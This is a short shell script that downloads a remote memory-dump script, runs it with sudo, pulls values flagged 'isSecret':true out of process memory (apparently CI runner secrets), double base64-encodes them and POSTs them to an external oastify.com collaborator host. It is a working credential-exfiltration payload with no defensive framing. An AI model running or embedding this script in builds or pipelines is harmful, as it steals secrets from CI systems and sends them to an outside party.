#!/bin/sh

e=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`

curl -X POST -d "$e" ztw2jzz0gmkcj13t8821l6f4xv3mrcf1.oastify.com